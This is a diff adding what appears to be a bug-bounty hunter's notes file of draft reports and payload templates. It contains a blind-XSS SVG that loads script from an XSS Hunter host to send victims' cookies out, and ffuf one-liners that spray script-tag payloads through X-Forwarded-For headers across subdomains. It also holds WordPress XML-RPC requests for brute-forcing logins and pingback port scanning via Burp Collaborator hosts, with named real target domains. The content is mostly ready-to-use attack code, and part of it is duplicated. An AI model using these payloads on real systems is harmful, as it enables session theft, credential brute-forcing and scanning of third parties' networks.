@@ -1,0 +1,179 @@
+Blind XSS =
+1. File Upload
+2. Header Based 
+
+
+Hello team,
+
+I found Stored XSS leads to blind xss
+
+Description:
+Blind XSS vulnerabilities are a variant of persistent XSS vulnerabilities. They occur when the attacker input is saved by the web server and executed as a malicious script in another part of the application or in another application. For example, an attacker injects a malicious payload into a contact/feedback page and when the administrator of the application is reviewing the feedback entries the attacker’s payload will be loaded. The attacker input can be executed in a completely different application (for example an internal application where the administrator reviews the access logs or the application exceptions).
+
+In your case , the support agent viewed the file where XSS executed and I was able to get info.
+
+
+Steps:
+1. Save following code in .svg extension
+
+
+<svg width="200" height="200" zoomAndPan="disable" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve">
+    <!-- Script linked from the outside-->
+    <script xlink:href="https://royboy.xss.ht"/>
+    <script>
+      //<![CDATA[
+        alert("ble");
+      ]]>
+    </script>
+  </svg>
+
+2. Save it as any.svg
+3. Go to the my.sirv.com and file upload section
+4. Capture upload request and check response of it
+5. Copy Link of file and open in browser = XSS POPUP
+
+Example of applications where Blind XSS vulnerabilities can occur:
+
+Contact/Feedback pages
+Log viewers
+Exception handlers
+Chat applications / Forums
+Customer ticket applications
+Web Application Firewalls
+Any application that requires user moderation
+
+Impact:  Those who ever open https://oustiocr.sirv.com/IMGXSS.svg it'll perform XSS on his/her browser and it will send cookies to attackers account
+
+Attaching Video POC:
+
+
+
+Needs ?
+
+
+<svg width="200" height="200" zoomAndPan="disable" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve">
+    <!-- Script linked from the outside-->
+    <script xlink:href="https://yourserver.xss.ht"/>
+    <script>
+      //<![CDATA[
+        alert("ble");
+      ]]>
+    </script>
+  </svg>
+
+
+
+  Account on xsshunter 
+
+
+
+  Function to upload file
+
+
+
+
+ffuf -w epicsubs.txt -u FUZZ -H "X-Original-IP: ><script src=https://royboy.xss.ht><script> " -mc 200
+
+
+
+
+
+
+
+1. Get subs of your target 
+2. Account on xsshunter
+3. ffuf -w epicsubs.txt -u FUZZ -H "X-Forwarded-For: ><script src=https://your_domain.xss.ht><script> " -mc 200
+
+
+Origin IP
+
+
+1. PHP exploit
+2. Search engines : zoomeye and censys
+
+
+
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+
+
+Now to perform the bruteforce login send send the following in the POST request , if you know any valid usernames that would be even better
+I would recommand wp-scan to find a list of valid usernames ,almost all the time companies never try to prevent username enumeration on wordpress sites .
+
+<methodCall>
+<methodName>wp.getUsersBlogs</methodName>
+<params>
+<param><value>admin</value></param>
+<param><value>pass</value></param>
+</params>
+</methodCall>
+
+
+
+XSPA or simply port scanning
+
+
+
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params><param>
+<value><string>http://4puneg3roa8tui1m18m8y7cel5rvfk.burpcollaborator.net</string></value>
+</param><param><value><string>https://yumemachimyblog.wordpress.com</string>
+</value></param></params>
+</methodCall>
+
+
+
+XML-RPC on WordPress is actually an API or “application program  interface“. It gives developers who make mobile apps, desktop apps and  other services the ability to talk to your WordPress site. The XML-RPC API  that WordPress provides gives developers a way to write applications (for  you) that can do many of the things that you can do when logged into  WordPress via the web interface. These include: 
+Publish a post 
+Edit a post 
+Delete a post. 
+Upload a new file (e.g. an image for a post) 
+Get a list of comments 
+Edit comments 
+Following domains are vulnerable for this attack 
+https://www.agri10x.com/xmlrpc.php 
+https://www.home.agri10x.com/xmlrpc.php 
+https://www.onboarding.agri10x.com/xmlrpc.php 
+https://test.agri10x.com/xmlrpc.php 
+https://www.emarket.agri10x.com/xmlrpc.php 
+The first thing to do now is Send a POST request and list all the  available methods , why ? cause that’s how we’ll know which actions are  even possible to make and potentially use one of them for an attack. TO list all methods Send a POST request with the following POST data,like  shown in the picture,you’ll get a response with all the methods avaliable 
+<methodCall> 
+<methodName>system.listMethods</methodName> 
+<params></params> 
+</methodCall> 
+Now to perform the bruteforce login send send the following in the POST  request , if you know any valid usernames that would be even better I would recommand wp-scan to find a list of valid usernames ,almost all  the time companies never try to prevent username enumeration on wordpress  sites . 
+<methodCall> 
+<methodName>wp.getUsersBlogs</methodName> 
+<params> 
+<param><value>admin</value></param> 
+<param><value>pass</value></param> 
+</params> 
+</methodCall> 
+XSPA or simply port scanning
+<methodCall> 
+<methodName>pingback.ping</methodName> 
+<params><param> 
+<value><string>http://<YOUR SERVER >:<port></string></value> </param><param><value><string>http://<SOME VALID BLOG FROM THE  SITE ></string> 
+</value></param></params> 
+</methodCall> 
+There are 2 things to be filled here 
+1) The link of your server 
+2) link of some valid post from the wordpress site which is used to call  the ping back 
+Request: 
+POST /xmlrpc.php HTTP/1.1 
+Host: agri10x.com 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0)  Gecko/20100101 Firefox/74.0 
+Accept:  
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 
+Accept-Encoding: gzip, deflate 
+Connection: close 
+Content-Length: 268 
+<methodCall> 
+<methodName>pingback.ping</methodName> 
+<params><param> 
+<value><string>http://ke2b9llo6aqh807p8oiois18uz0poe.burpcollaborator.net< /string></value> 
+</param><param><value><string>http://agri10x.com</string> </value></param></params> 
+</methodCall>
